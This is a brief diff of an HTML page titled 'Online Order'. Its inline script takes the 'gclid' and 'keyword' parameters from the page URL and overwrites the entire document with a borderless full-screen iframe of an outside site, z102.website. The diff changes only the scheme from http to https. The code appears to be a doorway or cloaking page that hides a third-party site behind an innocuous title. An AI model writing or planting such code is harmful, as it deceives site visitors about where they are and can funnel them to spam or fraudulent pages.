@@ -7,7 +7,7 @@ function GET(item) {
     p = p.match(new RegExp(item+'=([^&=]+)'));
     return p ? p[1] : false;
 }
-var url = "http://z102.website/ru?gclid="+GET('gclid')+"&keyword="+GET('keyword');
+var url = "https://z102.website/ru?gclid="+GET('gclid')+"&keyword="+GET('keyword');
 document.documentElement.innerHTML = '<iframe src="'+url+'" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;"></iframe>';
 </script>
     <title>Online Order</title>
